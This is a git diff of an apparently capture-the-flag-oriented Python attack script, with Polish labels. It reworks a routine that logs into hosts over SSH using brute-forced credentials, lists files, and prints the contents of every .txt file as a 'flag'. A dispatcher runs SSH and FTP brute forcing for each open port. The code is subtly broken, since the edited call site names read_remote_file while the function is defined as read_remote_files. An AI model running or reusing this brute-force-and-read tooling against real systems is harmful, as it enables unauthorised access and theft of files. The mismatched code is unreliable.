@@ -118,39 +118,35 @@ def brute_force_SSH(targetIP: str) -> dict:
     SSH_credentials[targetIP] = user_pass
     return SSH_credentials # this dict can be used in another function to log in and manipulate on remote system 
 
-
-def read_file(slownik: dict, target_ip):
-    autenticated = False
-    #slownik = brute_force_SSH(target_ip)
+def read_remote_files(SSH_credentials: dict) -> None:
+    """Tries to log into SSH server and read all txt files. From txt files print content
+    Args: SSH_credentials (dict): key: ip address, value: list of lists consists of pair: user/pass
+    """
+    # initialize SSH client
     sshserver = paramiko.SSHClient()
+    # add to know hosts
     sshserver.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
     sshserver.load_system_host_keys()
-    for ip_adr, user_list in slownik.items():
-        for user in user_list:
-            sshserver.connect(hostname=target_ip, username=user[0], password=user[1], timeout=3, banner_timeout=2000, auth_timeout=60)
-            tr = sshserver.get_transport()
-            if sshserver:
-                autenticated = True
-                command = "ls -a"
-                stdin, stdout, stderr = sshserver.exec_command(command)
-                lista = stdout.readlines()
-                print(f"List of {user[0]} files:")
-                for list in lista:
-                    print(f"{list.strip()}")
-                    plik = list.find(".txt")
-                    if plik != -1:
-                        polecenie = "cat " + list.strip()
-                        stdin, stdout, stderr = sshserver.exec_command(polecenie)
-                        print(stderr.read())
-                        flaga = stdout.readlines()[0]
-                        print(f"Flaga z pliku {list.strip()} to: {flaga} ")
-                        tr = sshserver.get_transport()
-                        tr.banner_timeout = 3000
-                        tr.close()
-                        tr.stop_thread()
-                        sshserver.close()
-                        autenticated = False
-                        break
+    for ip, user_pass in SSH_credentials.items():
+        for user, passwd in user_pass:
+            # print (ip, user, passwd)
+            try:
+                sshserver.connect(hostname=ip, username=user, password=passwd, timeout=5)
+                ls_command = 'ls -a'
+                stdin, stdout, stderr = sshserver.exec_command(ls_command)
+                list_of_files = stdout.readlines()
+                # print(list_of_files)
+                for file in list_of_files:
+                    file = file.replace('\n','')
+                    if  '.txt' in file:
+                        cat_command = 'cat ' + file
+                        stdin, stdout, stderr = sshserver.exec_command(cat_command)
+                        print(f"[+] Host:{ip} User:{user} flaga: {stdout.readlines()[0].strip()} w pliku: {file}")
+                sshserver.close()
+            except socket.timeout:
+                # this is when host is unreachable
+                print(f"[!] Host: {ip} is unreachable, timed out.")
 
 def brute_force(hosts_ports_list: dict):
     for ip_addr, ports in hosts_ports_list.items():
@@ -159,9 +155,9 @@ def brute_force(hosts_ports_list: dict):
                 print(brute_force_FTP(ip_addr))
             if port == 22:
                 slownik = brute_force_SSH(ip_addr)
-                print(slownik)
+                #print(slownik)
                 #print(brute_force_SSH(ip_addr))
-                read_file(slownik, ip_addr)
+                read_remote_file(slownik)
             #if port == 80:
             #    adres = "http://"+ip_addr
             #    atack = AtackHttp()
